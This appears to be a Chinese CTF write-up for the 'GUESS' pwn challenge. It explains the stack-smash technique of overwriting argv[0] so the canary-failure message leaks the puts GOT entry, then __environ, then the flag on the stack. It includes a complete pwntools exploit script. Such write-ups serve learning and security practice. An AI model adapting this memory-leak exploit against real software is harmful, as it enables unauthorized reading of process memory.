首先checksec

![image-20210413125356579](https://static.hack1s.fun/images/2021/04/13/image-20210413125356579.png)

反编译main函数

![image-20210413125438694](https://static.hack1s.fun/images/2021/04/13/image-20210413125438694.png)

里面打开了flag，之后读0x30到buf

一共可以输入三次，每次都是gets函数可以溢出

但是程序开启了canary，所以需要想办法绕过canary

这里调试到gets时

![image-20210413145133466](https://static.hack1s.fun/images/2021/04/13/image-20210413145133466.png)

输入的缓冲区是`db40`，argv[0]在`dc78`，flag在`db10`

所以用stack smash把`argv[0]`覆盖成flag的地址就可以了(这里蛮奇怪，自己调试看到相差0x138，但是打不通，看了别的writeup改成128就通了)

但是由于我们不知道栈上的地址，需要先泄漏栈上的内容

首先泄漏`puts`在got表中的地址，计算得到libc基地址；

```python
payload1 = b'a'*0x128 + p64(elf.got['puts'])
puts_got = u64(io.recv(6).ljust(8,b'\x00'))
```

通过libc基地址计算出libc中的`__environ`的地址

第二次泄漏出`__environ`的值，即栈上的地址；

```python
payload2 = b'a'*0x128 + p64(environ_addr)
stack_addr = u64(io.recv(6).ljust(8,b'\x00'))
```



最后计算出存储flag的buf与`environ`之间的距离，泄漏出flag

例如图中，`envrion`地址是`dc78`，flag所在buf地址为`db10`

两者相差`0x168`

```python
payload3 = b'a'*0x128 + p64(stack_addr - 0x168)
```

最终payload

```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.terminal = ['konsole','sh','-e']
io = process('GUESS')
#  io = remote('node3.buuoj.cn',27674)
elf = ELF('./GUESS')

payload1 = b'a'*0x128+p64(elf.got['puts'])

io.recvuntil('guessing flag\n')
io.sendline(payload1)

io.recvuntil('***: ')
#
puts_got = u64(io.recv(6).ljust(8,b'\x00'))
print("Puts Addr:",hex(puts_got))

libc = LibcSearcher('puts',puts_got)

libc_base = puts_got - libc.dump('puts')
print("Libc Base:",hex(libc_base))

environ = libc_base + libc.dump('__environ')

payload2 = b'a'*0x128 + p64(environ)
io.recvuntil('guessing flag\n')
io.sendline(payload2)

io.recvuntil('***: ')
stack_addr = u64(io.recv(6).ljust(8,b'\x00'))
print("Stack End:",hex(stack_addr))

payload3 = b'a'*0x128 + p64(stack_addr - 0x168)
io.recvuntil('guessing flag\n')
io.sendline(payload3)
io.recvuntil('***: ')
flag = io.recvline()
print(flag)

io.interactive()
```

总结一下，这里面用到的技术是stack smash，在CTF wiki里面花式栈溢出的部分

原理就是canary被破坏的时候会调用`__stack_chk_fail`

在低版本的lib中实际上执行的代码是
```C
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

这里如果覆盖了`__libc_argv[0]`为自己想要输出的内容，就实现了一个任意地址读的效果

就可以读到flag了